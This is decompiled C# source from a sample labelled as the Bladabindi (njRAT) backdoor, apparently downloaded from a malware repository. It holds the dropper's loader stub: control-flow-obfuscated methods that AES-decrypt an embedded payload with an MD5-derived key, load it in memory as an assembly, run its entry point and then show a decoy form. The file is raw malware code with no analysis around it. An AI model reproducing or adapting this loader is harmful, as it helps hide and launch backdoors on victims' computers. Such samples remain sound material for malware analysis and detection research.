// Decompiled with JetBrains decompiler
// Type: Ⴐ.Ⴀ
// Assembly: Clean, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 958D9B28-BCA8-467B-B5F1-19B14D181F81
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Bladabindi.gen-646ae7c4ec7357953b07a88fe5928f2e486e4c7ee1ff639d817f662f19117c4a.exe

using Clean;
using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace Ⴐ
{
  internal static class Ⴀ
  {
    [STAThread]
    [SecuritySafeCritical]
    private static void Ⴄ()
    {
      Form1.ႥႤ();
      int num = 0;
      byte[] rawAssembly;
      Delegate @delegate;
      while (true)
      {
        switch (num)
        {
          case 1:
          case 5:
            // ISSUE: type reference
            @delegate = Delegate.CreateDelegate(Ⴐ.Ⴍ.Ⴈ.Ⴐ(__typeref (Action), 908, 990), Form1.Ⴅ(636, 536).Load(rawAssembly).EntryPoint);
            goto case 6;
          case 2:
            goto label_6;
          case 3:
            rawAssembly = Ⴐ.Ⴀ.Ⴗ(Ⴐ.Ⴍ.Ⴈ.Ⴃ.Ⴗ(Ⴐ.Ⴍ.Ⴗ(1157617072, 6), 442, 477), Ⴐ.Ⴍ.Ⴗ(1157540061, 4));
            num = 5;
            continue;
          case 6:
            num = 2;
            continue;
          default:
            Form1.Ⴈ(80, 74);
            Ⴐ.Ⴀ.Ⴍ(false, 50, 14);
            num = 3;
            continue;
        }
      }
label_6:
      @delegate.DynamicInvoke((object[]) null);
      Application.Run((Form) new Form1());
    }

    public static byte[] Ⴗ(byte[] Ⴈ, string Ⴀ)
    {
label_3:
      byte[] numArray1 = Ⴐ.Ⴀ.Ⴐ((HashAlgorithm) new MD5CryptoServiceProvider(), Ⴐ.Ⴍ.Ⴈ.Ⴃ.Ⴅ(Ⴐ.Ⴍ.Ⴈ.Ⴈ(426, 420), Ⴀ, 882, 793), 494, 491);
      int num = 5;
      AesCryptoServiceProvider cryptoServiceProvider;
      byte[] numArray2;
      while (true)
      {
        switch (num)
        {
          case 1:
            goto label_6;
          case 2:
          case 5:
            cryptoServiceProvider = new AesCryptoServiceProvider();
            Ⴐ.Ⴍ.Ⴈ.Ⴃ.Ⴀ((SymmetricAlgorithm) cryptoServiceProvider, numArray1, 8, 73);
            Ⴐ.Ⴍ.Ⴈ.Ⴄ((SymmetricAlgorithm) cryptoServiceProvider, CipherMode.ECB, 203, 240);
            num = 6;
            continue;
          case 3:
          case 7:
            goto label_3;
          case 6:
            numArray2 = cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(Ⴈ, 0, Ⴈ.Length);
            num = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.Ⴗ);
            num = 7;
            continue;
        }
      }
label_6:
      return numArray2;
    }

    [SecuritySafeCritical]
    static Ⴀ() => Form1.ႥႤ();

    [SecuritySafeCritical]
    internal static void Ⴍ([In] bool obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 3;
            continue;
          case 1:
          case 4:
          case 5:
            goto label_7;
          case 2:
            goto label_8;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 60:
                num2 = 5;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      Application.SetCompatibleTextRenderingDefault(obj0);
    }

    [SecuritySafeCritical]
    internal static void Ⴃ([In] Control obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 3:
            goto label_7;
          case 4:
            num1 = 5;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 37:
                num2 = 3;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Name = obj1;
    }

    [SecuritySafeCritical]
    internal static byte[] Ⴐ([In] HashAlgorithm obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 5:
          num1 = 5;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 2:
          case 5:
            goto label_8;
          case 4:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          case 7:
            num2 = 6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.Ⴐ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.ComputeHash(obj1);
    }

    [SecuritySafeCritical]
    internal static void Ⴓ([In] ContainerControl obj0, [In] AutoScaleMode obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_8;
          case 1:
          case 4:
            goto label_7;
          case 2:
            goto label_9;
          case 5:
            num1 = 3;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 124:
                num2 = 4;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_9:
      return;
label_7:
      obj0.AutoScaleMode = obj1;
    }

    [SecuritySafeCritical]
    internal static Control.ControlCollection Ⴈ([In] Control obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 35:
          num1 = 6;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 2;
            continue;
          case 1:
            num2 = 2;
            continue;
          case 2:
            goto label_3;
          case 3:
          case 6:
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.Ⴈ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0.Controls;
    }

    [SecuritySafeCritical]
    internal static Assembly Ⴅ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 22:
          num1 = 5;
          break;
        case 23:
          num1 = 0;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_10;
          case 1:
          case 4:
          case 7:
            goto label_3;
          case 2:
          case 8:
            num2 = 7;
            continue;
          case 3:
            num2 = 7;
            continue;
          case 5:
            goto label_9;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.Ⴅ);
            num2 = 7;
            continue;
        }
      }
label_9:
      return Assembly.GetExecutingAssembly();
label_10:
      return Assembly.GetExecutingAssembly();
    }

    [SecuritySafeCritical]
    internal static string Ⴜ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 41:
          num1 = 3;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 5;
            continue;
          case 1:
            num2 = 5;
            continue;
          case 2:
          case 3:
            goto label_8;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.Ⴜ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.ToString() + obj1;
    }

    [SecuritySafeCritical]
    internal static long ႷႠ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 103:
          num1 = 0;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_8;
          case 2:
          case 4:
            num2 = 6;
            continue;
          case 3:
          case 7:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.ႷႠ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.Length;
    }

    [SecuritySafeCritical]
    internal static byte[] ႷႷ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 84:
          num1 = 5;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            goto label_3;
          case 2:
          case 5:
            goto label_8;
          case 4:
          case 7:
            num2 = 3;
            continue;
          case 6:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.ႷႷ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return obj0.ToArray();
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴀ
    {
      internal IContainer Ⴗ;
      internal TextBox Ⴃ;
      internal TextBox Ⴈ;
    }
  }
}
